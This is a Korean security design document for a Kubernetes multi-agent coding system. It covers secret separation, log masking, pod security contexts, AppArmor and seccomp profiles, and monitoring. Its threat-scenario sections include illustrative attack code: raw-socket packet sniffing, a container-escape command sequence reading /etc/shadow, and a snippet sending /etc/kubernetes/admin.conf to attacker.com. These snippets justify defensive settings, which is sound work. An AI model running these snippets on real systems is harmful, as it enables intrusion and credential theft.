CREATE USER agent_ro WITH PASSWORD 'ro-password';
GRANT CONNECT ON DATABASE agent_db TO agent_ro;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO agent_ro;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO agent_ro;

-- 리뷰어는 과거 리뷰 결과를 참조만 함 (수정 불가)
```

**설계 근거**:
- **reviewer는 읽기만**: 리뷰어는 코드/명세서를 수정하지 않고 검증만 수행
- **INSERT/UPDATE/DELETE 차단**: DB 레벨에서 쓰기 차단 (NetworkPolicy + DB RBAC 이중 보호)

### 6.6 로그에서 시크릿 제외 패턴

**문제**: 로그에 시크릿이 노출되면?

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
// 잘못된 로깅
console.log('Connecting to Redis:', process.env.REDIS_URL);
// 출력: Connecting to Redis: redis://:my-secret-password@redis:6379
// → 로그 수집 시스템에 비밀번호 노출!

// LLM API 오류 로깅
console.error('OpenAI API error:', error);
// 출력: OpenAI API error: { config: { headers: { 'Authorization': 'Bearer sk-proj-...' } } }
// → API 키 노출!
```

**해결: 시크릿 마스킹**

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
// logger.ts
import * as util from 'util';

const SENSITIVE_KEYS = [
  'password',
  'api_key',
  'token',
  'secret',
  'authorization',
  'bearer',
];

function redactSensitiveData(obj: any): any {
  if (typeof obj !== 'object' || obj === null) return obj;
  
  const redacted = Array.isArray(obj) ? [...obj] : { ...obj };
  
  for (const key in redacted) {
    const lowerKey = key.toLowerCase();
    if (SENSITIVE_KEYS.some(sensitive => lowerKey.includes(sensitive))) {
      redacted[key] = '[REDACTED]';
    } else if (typeof redacted[key] === 'object') {
      redacted[key] = redactSensitiveData(redacted[key]);
    }
  }
  
  return redacted;
}

export function safeLog(level: string, message: string, data?: any) {
  const redactedData = data ? redactSensitiveData(data) : undefined;
  console[level](message, redactedData);
}

// 사용 예시
safeLog('info', 'Connecting to Redis:', { url: process.env.REDIS_URL });
// 출력: Connecting to Redis: { url: '[REDACTED]' }

safeLog('error', 'OpenAI API error:', error);
// 출력: OpenAI API error: { config: { headers: { 'Authorization': '[REDACTED]' } } }
```

**환경변수 마스킹**:

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
// startup.ts
function maskEnvVars() {
  const sensitiveEnvs = [
    'OPENAI_API_KEY',
    'ANTHROPIC_API_KEY',
    'REDIS_URL',
    'DATABASE_URL',
    'GITHUB_TOKEN',
    'SEMGREP_API_KEY',
  ];
  
  for (const env of sensitiveEnvs) {
    if (process.env[env]) {
      const masked = process.env[env].slice(0, 8) + '...' + process.env[env].slice(-4);
      console.log(`✓ ${env}: ${masked}`);
    }
  }
}

// 애플리케이션 시작 시 호출
maskEnvVars();
// 출력:
// ✓ OPENAI_API_KEY: sk-proj-...xyz1
// ✓ REDIS_URL: redis://...6379
```

### 6.7 설계 근거: 왜 시크릿을 Pod별로 분리하는가

#### 6.7.1 문제 시나리오: 모든 Pod가 모든 시크릿에 접근

```yaml
# ❌ 나쁜 설계: 모든 Pod가 동일한 Secret 사용
env:
  - name: ALL_SECRETS
    valueFrom:
      secretKeyRef:
        name: all-secrets  # OpenAI, Redis, PostgreSQL, GitHub 모두 포함
        key: json-blob
```

**문제**:
- Worker가 침해되면 → GitHub 토큰 유출 → 코드 저장소 삭제 가능
- reviewer가 침해되면 → PostgreSQL 쓰기 가능 → 명세서 오염

#### 6.7.2 Pod별 분리 효과

| Pod | 침해 시 유출 가능한 시크릿 | 피해 범위 |
|-----|------------------------|----------|
| **Worker** | LLM API 키, Redis 비밀번호 | LLM API 오용, Redis 메시지 조작 (DB/GitHub 안전) |
| **reviewer** | Redis 비밀번호, PostgreSQL 읽기 전용 | Redis 메시지 조작 (DB 읽기만, GitHub 안전) |
| **OpenCode** | 모든 시크릿 | 전체 시스템 침해 (가장 위험하므로 보안 강화 필요) |

**설계 근거**:
- **피해 범위 최소화**: Worker 침해 시 GitHub 토큰은 안전 (깃 매니저만 보유)
- **계층적 보안**: 중요도가 낮은 Pod일수록 적은 시크릿 할당
- **감사 용이**: 어떤 Pod가 어떤 시크릿을 사용했는지 명확

### 6.8 시크릿 보안 체크리스트

- [ ] **Git 커밋 금지**: Secret 매니페스트는 `.gitignore` 또는 암호화 (SealedSecrets)
- [ ] **etcd 암호화**: K8s etcd에 저장된 Secret 암호화 (`--encryption-provider-config`)
- [ ] **RBAC 설정**: 개발자는 Secret 읽기 불가, CI/CD만 접근 가능
- [ ] **로테이션 정책**: 90일마다 API 키/비밀번호 변경
- [ ] **로그 마스킹**: 모든 로그에서 시크릿 자동 제거
- [ ] **감사 로그**: Secret 접근 로그 기록 (누가, 언제, 어떤 시크릿)
- [ ] **최소 권한**: Pod는 필요한 시크릿만 접근
- [ ] **읽기 전용 사용자**: DB 읽기만 필요한 Pod는 읽기 전용 자격증명

---

## 7. SecurityContext 및 Pod Security Standards

### 7.1 SecurityContext 개요

**설계 원칙**: 모든 Pod는 최소 권한으로 실행 (Defense in Depth)

**핵심 보안 설정**:
1. **runAsNonRoot**: root 사용자로 실행 금지
2. **readOnlyRootFilesystem**: 루트 파일 시스템 읽기 전용
3. **Capabilities Drop**: 불필요한 Linux capabilities 제거
4. **Seccomp/AppArmor**: 시스템 콜 제한

### 7.2 SecurityContext 설정 테이블

| Pod 이름 | runAsNonRoot | readOnlyRootFilesystem | allowPrivilegeEscalation | runAsUser | fsGroup |
|----------|--------------|------------------------|-------------------------|-----------|---------|
| **OpenCode Pod** | true | false | false | 1000 | 1000 |
| **Worker Pod** | true | true | false | 1001 | 1001 |
| **doc-manager Pod** | true | false | false | 1002 | 1002 |
| **project-lead Pod** | true | true | false | 1003 | 1003 |
| **reviewer Pod** | true | true | false | 1004 | 1004 |
| **junior Pod** | true | false | false | 1005 | 1005 |
| **Redis Pod** | true | false | false | 999 | 999 |
| **PostgreSQL Pod** | true | false | false | 999 | 999 |

**설계 근거**:
- **runAsNonRoot**: 컨테이너 탈출 공격 시 호스트 권한 획득 방지
- **readOnlyRootFilesystem**: Worker/reviewer는 `/workspace` PVC와 `/scratch` emptyDir만 쓰기 (루트 FS 변조 불가)
- **OpenCode/doc-manager는 false**: OpenCode는 캐시/로그 쓰기 필요, doc-manager는 Watchman 설정 필요
- **runAsUser 분리**: Pod별 고유 UID로 파일 소유권 추적 가능

### 7.3 Pod별 SecurityContext YAML 예시

#### 7.3.1 Worker Pod (가장 엄격)

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/deployments/worker.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: worker
  namespace: agent-system
spec:
  replicas: 0  # KEDA가 0→6 스케일링
  template:
    metadata:
      labels:
        app: worker
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1001
        fsGroup: 1001
        seccompProfile:
          type: RuntimeDefault  # 기본 seccomp 프로파일 적용
      containers:
        - name: worker
          image: agent-system/worker:1.0.0
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true  # 루트 FS 쓰기 불가
            capabilities:
              drop:
                - ALL  # 모든 capabilities 제거
          volumeMounts:
            - name: workspace-pvc
              mountPath: /workspace
              readOnly: true  # 읽기 전용
            - name: scratch
              mountPath: /scratch  # 임시 작업 공간 (쓰기 가능)
            - name: tmp
              mountPath: /tmp  # Node.js 캐시
          env:
            - name: NODE_ENV
              value: "production"
      volumes:
        - name: workspace-pvc
          persistentVolumeClaim:
            claimName: workspace-pvc
        - name: scratch
          emptyDir:
            sizeLimit: 500Mi
        - name: tmp
          emptyDir:
            sizeLimit: 200Mi
```

**설계 근거**:
- **readOnlyRootFilesystem: true**: Worker는 `/workspace` (RO) + `/scratch` (RW)만 쓰기 → 루트 FS 변조 불가
- **capabilities drop ALL**: Worker는 네트워크, 파일 I/O만 필요 (특수 권한 불필요)
- **seccompProfile RuntimeDefault**: 위험한 시스템 콜 차단 (ptrace, reboot, mount 등)

#### 7.3.2 OpenCode Pod (Watchman 고려)

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/deployments/opencode.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: opencode
  namespace: agent-system
spec:
  replicas: 1
  template:
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 1000
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: opencode
          image: agent-system/opencode:1.0.0
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: false  # 캐시/로그 쓰기 필요
            capabilities:
              drop:
                - ALL
              add:
                - NET_BIND_SERVICE  # 포트 8080 바인딩 (1024 이하 포트는 불필요하면 제거)
          volumeMounts:
            - name: workspace-pvc
              mountPath: /workspace
            - name: cache
              mountPath: /app/.cache  # OpenCode 캐시
            - name: logs
              mountPath: /app/logs  # 로그 출력
      volumes:
        - name: workspace-pvc
          persistentVolumeClaim:
            claimName: workspace-pvc
        - name: cache
          emptyDir:
            sizeLimit: 1Gi
        - name: logs
          emptyDir:
            sizeLimit: 500Mi
```

**설계 근거**:
- **readOnlyRootFilesystem: false**: OpenCode는 캐시 쓰기 필요 (emptyDir 볼륨으로 분리 가능하지만 복잡도 증가)
- **NET_BIND_SERVICE**: OpenCode는 외부 노출 서비스 (포트 바인딩 필요)
- **fsGroup: 1000**: PVC 파일 소유권 통일 (OpenCode가 생성한 파일을 다른 Pod도 읽기 가능)

#### 7.3.3 reviewer Pod (Seccomp 프로파일)

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/deployments/reviewer.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: reviewer
  namespace: agent-system
spec:
  replicas: 1
  template:
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1004
        fsGroup: 1004
        seccompProfile:
          type: Localhost
          localhostProfile: profiles/reviewer-seccomp.json  # 커스텀 seccomp
      containers:
        - name: reviewer
          image: agent-system/reviewer:1.0.0
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: workspace-pvc
              mountPath: /workspace
              readOnly: true
            - name: tmp
              mountPath: /tmp
      volumes:
        - name: workspace-pvc
          persistentVolumeClaim:
            claimName: workspace-pvc
        - name: tmp
          emptyDir:
            sizeLimit: 200Mi
```

**커스텀 Seccomp 프로파일 예시** (`profiles/reviewer-seccomp.json`):

```json
// ⚠️ 로직 이해용 예시 — 실제 프로파일은 구현 Phase에서 확정
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "close", "stat", "fstat",
        "lseek", "mmap", "mprotect", "munmap", "brk",
        "rt_sigaction", "rt_sigprocmask", "ioctl", "access",
        "socket", "connect", "sendto", "recvfrom", "bind",
        "listen", "accept", "getpid", "gettid", "clone",
        "execve", "wait4", "exit", "exit_group"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

**설계 근거**:
- **allowlist 방식**: 필요한 시스템 콜만 허용 (기본 차단)
- **차단되는 위험 시스템 콜**: `ptrace` (디버거), `reboot`, `mount` (파일시스템 조작), `setuid` (권한 상승)
- **reviewer는 코드 분석만 수행**: 파일 생성/네트워크만 필요 → 최소 시스템 콜만 허용

### 7.4 Pod Security Standards (PSS)

**K8s 1.25+에서 권장**: PodSecurityPolicy(deprecated) 대신 Pod Security Standards 사용

#### 7.4.1 PSS 레벨 정의

| 레벨 | 설명 | 적용 Pod |
|------|------|----------|
| **Privileged** | 제한 없음 (비추천) | 없음 |
| **Baseline** | 알려진 권한 상승 차단 (최소 보안) | Redis, PostgreSQL |
| **Restricted** | 강화된 보안 (권장) | Worker, reviewer, project-lead |

#### 7.4.2 네임스페이스 레벨 PSS 적용

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/namespace.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: agent-system
  labels:
    # Pod Security Standards 적용
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**설계 근거**:
- **enforce: restricted**: 네임스페이스 전체에 엄격한 보안 정책 적용
- **audit + warn**: 정책 위반 시 경고 + 감사 로그 기록
- **예외 처리**: Redis/PostgreSQL은 Baseline 필요 시 Pod 레벨 annotation으로 재정의

#### 7.4.3 Restricted 정책 요구사항

Restricted PSS를 통과하려면 다음 설정 필수:

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
securityContext:
  runAsNonRoot: true  # ✅ 필수
  seccompProfile:
    type: RuntimeDefault  # ✅ 필수 (또는 Localhost)
  
containers:
  - securityContext:
      allowPrivilegeEscalation: false  # ✅ 필수
      capabilities:
        drop:
          - ALL  # ✅ 필수
      runAsNonRoot: true  # ✅ 필수 (Pod 레벨과 중복 가능)
```

**자동 검증**:
```bash
# ⚠️ 로직 이해용 예시 — 실제 명령어는 구현 Phase에서 확정
# PSS 위반 검사
kubectl label --dry-run=server --overwrite ns agent-system \
  pod-security.kubernetes.io/enforce=restricted

# 출력 예시:
# Warning: Pod "opencode" violates Restricted: allowPrivilegeEscalation != false
```

### 7.5 AppArmor 프로파일

**AppArmor**: MAC (Mandatory Access Control) 시스템으로 프로세스별 파일/네트워크 접근 제한

#### 7.5.1 Worker용 AppArmor 프로파일

```bash
# ⚠️ 로직 이해용 예시 — 실제 프로파일은 구현 Phase에서 확정
# /etc/apparmor.d/k8s-worker
#include <tunables/global>

profile k8s-worker flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # 읽기 전용 workspace
  /workspace/** r,

  # 쓰기 가능 scratch
  /scratch/** rw,

  # 임시 파일
  /tmp/** rw,

  # Node.js 실행 필요
  /usr/bin/node rix,

  # 네트워크 허용 (Redis, LLM API)
  network inet stream,
  network inet6 stream,

  # 차단: 루트 파일시스템 쓰기
  deny / w,
  deny /etc/** w,
  deny /usr/** w,
  deny /bin/** w,
  deny /sbin/** w,

  # 차단: 민감한 파일 읽기
  deny /etc/shadow r,
  deny /etc/passwd w,
  deny /root/** rw,
}
```

#### 7.5.2 AppArmor 적용 YAML

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/deployments/worker.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: worker
  namespace: agent-system
spec:
  template:
    metadata:
      annotations:
        container.apparmor.security.beta.kubernetes.io/worker: localhost/k8s-worker
    spec:
      containers:
        - name: worker
          image: agent-system/worker:1.0.0
          # ... (생략)
```

**설계 근거**:
- **파일 접근 제한**: Worker는 `/workspace` (RO), `/scratch` (RW)만 접근
- **네트워크 제한**: AppArmor는 네트워크 프로토콜만 제한 (IP 필터링은 NetworkPolicy)
- **런타임 방어**: securityContext.readOnlyRootFilesystem=false여도 AppArmor가 추가 보호

### 7.6 Capabilities 상세 분석

**Linux Capabilities**: root 권한을 세분화한 단위 권한

#### 7.6.1 기본 Capabilities 목록 (drop 필요)

| Capability | 설명 | 위험도 | Worker 필요 여부 |
|-----------|------|--------|----------------|
| **CAP_CHOWN** | 파일 소유권 변경 | 중 | ❌ (PVC fsGroup으로 관리) |
| **CAP_DAC_OVERRIDE** | 파일 권한 무시 | 높음 | ❌ (권한 우회 가능) |
| **CAP_FOWNER** | 파일 속성 변경 | 중 | ❌ |
| **CAP_FSETID** | setuid/setgid 설정 | 높음 | ❌ (권한 상승 위험) |
| **CAP_KILL** | 다른 프로세스 종료 | 중 | ❌ |
| **CAP_NET_BIND_SERVICE** | 1024 이하 포트 바인딩 | 낮음 | ❌ (Worker는 8080+ 포트 사용) |
| **CAP_NET_RAW** | Raw 소켓 생성 | 높음 | ❌ (스니핑 공격 가능) |
| **CAP_SETGID** | GID 변경 | 높음 | ❌ (권한 상승 위험) |
| **CAP_SETUID** | UID 변경 | 높음 | ❌ (권한 상승 위험) |
| **CAP_SYS_ADMIN** | 시스템 관리 (mount 등) | 매우 높음 | ❌ |
| **CAP_SYS_CHROOT** | chroot 실행 | 높음 | ❌ (컨테이너 탈출 위험) |

#### 7.6.2 Capabilities 차단 효과 시나리오

**시나리오 1: CAP_NET_RAW 차단**
```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
// 만약 Worker가 CAP_NET_RAW를 가진다면?
import rawSocket from 'raw-socket';

class MaliciousWorker {
  async sniffNetwork() {
    // Raw 소켓으로 동일 네트워크 패킷 스니핑
    const socket = rawSocket.createSocket({ protocol: rawSocket.Protocol.ICMP });
    socket.on('message', (buffer, source) => {
      // Redis/PostgreSQL 비밀번호 스니핑 가능!
      console.log('Captured packet:', buffer.toString());
    });
  }
}
```

**차단 효과**: `capabilities.drop: [ALL]` 설정 시 Raw 소켓 생성 실패 → 네트워크 스니핑 불가

**시나리오 2: CAP_DAC_OVERRIDE 차단**
```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
// 만약 Worker가 CAP_DAC_OVERRIDE를 가진다면?
class MaliciousWorker {
  async bypassPermissions() {
    // 권한 무시하고 읽기 전용 파일 수정
    await fs.writeFile('/workspace/src/critical.ts', 'malicious code');
    
    // 다른 사용자 파일 접근
    await fs.readFile('/workspace/.env', 'utf-8');  // 본래 접근 불가
  }
}
```

**차단 효과**: `capabilities.drop: [ALL]` 설정 시 DAC 우회 불가 → readOnly 볼륨 강제 적용

### 7.7 Pod Security 검증 플로우

```mermaid
graph TD
    A[Pod 생성 요청] --> B{PSS enforce 체크}
    B -->|위반| C[Pod 생성 거부]
    B -->|통과| D{SecurityContext 검증}
    D -->|runAsRoot=true| C
    D -->|allowPrivilegeEscalation=true| C
    D -->|통과| E{Seccomp 프로파일 로드}
    E -->|실패| C
    E -->|성공| F{AppArmor 프로파일 로드}
    F -->|실패| C
    F -->|성공| G[Pod 실행]
    
    G --> H[런타임 AppArmor 정책 적용]
    H --> I[Seccomp 시스템 콜 필터링]
    I --> J[Capabilities 제한 적용]
    J --> K[정상 동작]
    
    K --> L{정책 위반 시도}
    L -->|파일 쓰기 시도| M[AppArmor 차단]
    L -->|위험 시스템 콜| N[Seccomp 차단]
    L -->|Raw 소켓 생성| O[Capabilities 차단]
    
    M --> P[로그 기록 + 차단]
    N --> P
    O --> P
```

**설계 근거**:
- **다층 방어**: PSS (배포 시) → SecurityContext (실행 시) → AppArmor/Seccomp (런타임)
- **Fail-Safe**: 하나라도 위반 시 Pod 생성 거부 (보안 우선)
- **감사 가능**: 모든 위반 시도는 K8s Audit Log + AppArmor Log에 기록

### 7.8 설계 근거: 왜 이러한 보안 제한이 필요한가

#### 7.8.1 컨테이너 탈출 공격 방어

**공격 시나리오**: Worker가 root로 실행되고 CAP_SYS_ADMIN을 가진다면?

```bash
# ⚠️ 로직 이해용 예시 — 실제 공격 시연용 아님
# 컨테이너 내부에서 호스트 파일시스템 마운트
mount /dev/sda1 /mnt
cat /mnt/etc/shadow  # 호스트의 /etc/shadow 접근 가능!

# 다른 Pod의 파일 시스템 접근
nsenter -t 1 -m -u -i -n -p  # 호스트 네임스페이스 침입
```

**방어 효과**:
- `runAsNonRoot: true` → root 실행 차단
- `capabilities.drop: [ALL]` → CAP_SYS_ADMIN 제거 (mount 불가)
- `allowPrivilegeEscalation: false` → setuid 바이너리 무력화

#### 7.8.2 측면 이동 공격 방어 (Lateral Movement)

**공격 시나리오**: Worker가 침해되고 네트워크 제한이 없다면?

1. Worker 침해 → Redis 비밀번호 획득
2. Redis 접속 → 다른 Worker의 작업 가로채기
3. PostgreSQL 접속 시도 → 명세서 오염
4. OpenCode Pod 침투 시도 → GitHub 토큰 탈취

**방어 효과**:
- **NetworkPolicy**: Worker → PostgreSQL 차단 (섹션 4)
- **시크릿 분리**: Worker는 GitHub 토큰 미보유 (섹션 6)
- **readOnlyRootFilesystem**: Worker에 백도어 설치 불가 (재시작 시 초기화)
- **Seccomp**: Worker는 ptrace 불가 (다른 프로세스 디버깅 불가)

#### 7.8.3 데이터 유출 방어

**공격 시나리오**: Worker가 민감 파일 읽기 가능하다면?

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
// 만약 Worker가 AppArmor 제한 없다면?
class MaliciousWorker {
  async exfiltrateSecrets() {
    // 호스트의 민감 파일 읽기 시도
    const secrets = await fs.readFile('/etc/kubernetes/admin.conf', 'utf-8');
    
    // 외부 유출
    await fetch('https://attacker.com/exfiltrate', {
      method: 'POST',
      body: secrets,
    });
  }
}
```

**방어 효과**:
- **AppArmor**: `/workspace`와 `/scratch` 외 파일 접근 거부
- **NetworkPolicy**: Worker는 allowlist IP만 접근 (섹션 4)
- **readOnlyRootFilesystem**: 루트 FS 읽기만 가능 (민감 파일은 별도 마운트 필요)

### 7.9 보안 설정 우선순위 가이드

| 우선순위 | 설정 | 적용 대상 | 효과 |
|---------|------|----------|------|
| **1 (필수)** | runAsNonRoot: true | 모든 Pod | 컨테이너 탈출 방어 |
| **2 (필수)** | capabilities.drop: [ALL] | 모든 Pod | 권한 상승 차단 |
| **3 (필수)** | allowPrivilegeEscalation: false | 모든 Pod | setuid 공격 차단 |
| **4 (권장)** | readOnlyRootFilesystem: true | Worker, reviewer, project-lead | 백도어 설치 방지 |
| **5 (권장)** | seccompProfile: RuntimeDefault | 모든 Pod | 위험 시스템 콜 차단 |
| **6 (선택)** | AppArmor 프로파일 | Worker, reviewer | 파일 접근 세밀 제어 |
| **7 (선택)** | Seccomp 커스텀 프로파일 | reviewer | 최소 시스템 콜만 허용 |

**설계 근거**:
- **우선순위 1~3**: PSS Restricted 통과 필수 조건
- **우선순위 4~5**: 대부분의 공격 차단 (운영 복잡도 낮음)
- **우선순위 6~7**: 고급 보안 (운영 복잡도 높지만 추가 보호)

---

## 8. 모니터링 및 관찰성 (Observability)

### 8.1 관찰성 개요

**문제 인식**: 격리된 Pod 환경에서는 디버깅이 어려움
- Worker는 읽기 전용 + 네트워크 제한 → `kubectl exec` 접속해도 제한적
- 여러 Pod가 병렬 실행 → 어느 Pod에서 에러 발생했는지 추적 어려움
- 비동기 작업 → 사용자 요청부터 Worker 완료까지 흐름 추적 필요

**해결 방법**: **3 Pillars of Observability**
1. **Metrics**: 시스템 리소스, 작업 처리량, 에러율
2. **Logs**: 구조화된 로그 (JSON), 중앙 집중 수집
3. **Traces**: 분산 추적 (사용자 요청 → 여러 Pod 경유)

### 8.2 메트릭 수집 (Prometheus)

#### 8.2.1 수집 대상 메트릭

| 메트릭 카테고리 | 메트릭 이름 | 설명 | 임계값 |
|---------------|-----------|------|--------|
| **리소스** | `container_cpu_usage_seconds_total` | CPU 사용률 | > 80% 경고 |
| | `container_memory_working_set_bytes` | 메모리 사용량 | > 90% 경고 |
| **작업 큐** | `redis_stream_pending_messages` | 대기 중인 작업 수 | > 100 경고 |
| | `worker_task_processing_duration_seconds` | 작업 처리 시간 | > 300s 경고 |
| **에러율** | `worker_task_failed_total` | 실패한 작업 수 | > 10% 경고 |
| | `http_requests_total{status="500"}` | HTTP 5xx 에러 | > 1% 경고 |
| **KEDA** | `keda_scaler_active` | Worker 스케일링 활성화 | 0/1 |
| | `worker_replica_count` | 현재 Worker 수 | 0~6 |

#### 8.2.2 Prometheus ServiceMonitor 예시

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/monitoring/servicemonitor-worker.yaml
apiVersion: monitoring.coreos.com/v1
kind: ServiceMonitor
metadata:
  name: worker-metrics
  namespace: agent-system
spec:
  selector:
    matchLabels:
      app: worker
  endpoints:
    - port: metrics  # Worker Service의 메트릭 포트 (예: 9090)
      interval: 15s
      path: /metrics
      scheme: http
```

#### 8.2.3 Worker 메트릭 노출 코드 예시

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
import client from 'prom-client';
import express from 'express';

// Prometheus 메트릭 정의
const taskDuration = new client.Histogram({
  name: 'worker_task_processing_duration_seconds',
  help: 'Duration of task processing in seconds',
  labelNames: ['task_type', 'status'],
  buckets: [1, 5, 15, 30, 60, 120, 300],  // 1s~5m
});

const taskCounter = new client.Counter({
  name: 'worker_task_completed_total',
  help: 'Total number of completed tasks',
  labelNames: ['task_type', 'status'],
});

// 메트릭 엔드포인트 노출 (포트 9090)
const app = express();
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', client.register.contentType);
  res.end(await client.register.metrics());
});
app.listen(9090);

// Worker 작업 처리 시 메트릭 기록
class WorkerAgent {
  async executeTask(task: Task) {
    const endTimer = taskDuration.startTimer({ task_type: task.type });
    
    try {
      await this.processTask(task);
      taskCounter.inc({ task_type: task.type, status: 'success' });
      endTimer({ status: 'success' });
    } catch (error) {
      taskCounter.inc({ task_type: task.type, status: 'failed' });
      endTimer({ status: 'failed' });
      throw error;
    }
  }
}
```

### 8.3 로그 수집 (Loki + Promtail)

#### 8.3.1 구조화된 로그 포맷

**권장**: JSON 로그 (필터링/검색 용이)

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
import winston from 'winston';

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),  // JSON 로그
  defaultMeta: { 
    service: 'worker',
    pod: process.env.HOSTNAME,  // K8s Pod 이름
    workerId: process.env.WORKER_ID,
  },
  transports: [
    new winston.transports.Console(),  // stdout으로 출력 → Promtail 수집
  ],
});

// 로그 출력 예시
logger.info('Task started', {
  taskId: 'task-123',
  taskType: 'feature-development',
  userId: 'user-456',
  traceId: 'trace-789',  // 분산 추적 ID
});

// 에러 로그 (스택 트레이스 포함)
logger.error('Task execution failed', {
  taskId: 'task-123',
  error: {
    message: error.message,
    stack: error.stack,
    code: error.code,
  },
  traceId: 'trace-789',
});
```

**출력 예시**:
```json
{
  "level": "info",
  "message": "Task started",
  "service": "worker",
  "pod": "worker-7f9c5d6b8-9x2kl",
  "workerId": "worker-003",
  "taskId": "task-123",
  "taskType": "feature-development",
  "userId": "user-456",
  "traceId": "trace-789",
  "timestamp": "2026-02-18T10:30:45.123Z"
}
```

#### 8.3.2 Promtail DaemonSet 배포

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/monitoring/promtail.yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: promtail
  namespace: agent-system
spec:
  selector:
    matchLabels:
      app: promtail
  template:
    metadata:
      labels:
        app: promtail
    spec:
      serviceAccountName: promtail
      containers:
        - name: promtail
          image: grafana/promtail:2.9.0
          args:
            - -config.file=/etc/promtail/config.yaml
          volumeMounts:
            - name: config
              mountPath: /etc/promtail
            - name: varlog
              mountPath: /var/log
              readOnly: true
            - name: varlibdockercontainers
              mountPath: /var/lib/docker/containers
              readOnly: true
      volumes:
        - name: config
          configMap:
            name: promtail-config
        - name: varlog
          hostPath:
            path: /var/log
        - name: varlibdockercontainers
          hostPath:
            path: /var/lib/docker/containers
```

**Promtail 설정**:
```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# Promtail ConfigMap
server:
  http_listen_port: 9080

clients:
  - url: http://loki:3100/loki/api/v1/push

scrape_configs:
  - job_name: kubernetes-pods
    kubernetes_sd_configs:
      - role: pod
        namespaces:
          names:
            - agent-system
    pipeline_stages:
      - json:  # JSON 로그 파싱
          expressions:
            level: level
            message: message
            traceId: traceId
      - labels:  # 라벨 추출 (Loki 인덱스)
          level:
          traceId:
    relabel_configs:
      - source_labels: [__meta_kubernetes_pod_label_app]
        target_label: app
      - source_labels: [__meta_kubernetes_pod_name]
        target_label: pod
```

#### 8.3.3 Loki 쿼리 예시

**LogQL** (Loki Query Language):

```logql
# Worker의 에러 로그만 조회
{app="worker", level="error"} |= "Task execution failed"

# 특정 traceId 관련 모든 로그 (분산 추적)
{namespace="agent-system"} | json | traceId="trace-789"

# 지난 1시간 동안 에러 발생 빈도
sum(rate({app=~"worker|reviewer", level="error"}[1h])) by (app)
```

### 8.4 분산 추적 (Jaeger/Tempo)

#### 8.4.1 추적 흐름 다이어그램

```mermaid
sequenceDiagram
    participant U as 사용자
    participant O as OpenCode Pod
    participant PL as project-lead Pod
    participant W1 as Worker Pod 1
    participant W2 as Worker Pod 2
    participant R as reviewer Pod
    
    U->>O: "새로운 기능 개발 요청"
    Note over O: traceId: trace-789 생성
    O->>PL: 명세서 작성 요청 (traceId: trace-789)
    PL->>PL: 명세서 분석 (span: analyze-spec)
    PL->>O: 명세서 완료 (traceId: trace-789)
    
    O->>W1: 작업 1 할당 (traceId: trace-789, span: task-123)
    O->>W2: 작업 2 할당 (traceId: trace-789, span: task-456)
    
    W1->>W1: 코드 생성 (span: generate-code)
    W2->>W2: 테스트 작성 (span: write-tests)
    
    W1->>R: diff 제출 (traceId: trace-789, span: review-123)
    W2->>R: diff 제출 (traceId: trace-789, span: review-456)
    
    R->>R: 보안 스캔 (span: security-scan)
    R->>O: 리뷰 완료 (traceId: trace-789)
    
    O->>U: 기능 개발 완료 (traceId: trace-789)
```

#### 8.4.2 OpenTelemetry 계측 코드

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
